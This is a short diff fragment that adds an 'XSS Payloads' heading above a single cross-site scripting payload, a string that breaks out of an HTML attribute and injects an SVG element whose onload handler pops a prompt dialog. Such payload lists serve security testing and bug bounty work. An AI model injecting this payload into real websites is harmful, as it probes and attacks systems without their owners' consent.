@@ -1,3 +1,5 @@
+#XSS Payloads
+
 
 ```
 "><svg/onload=prompt(/OPENBUGBOUNTY/)>
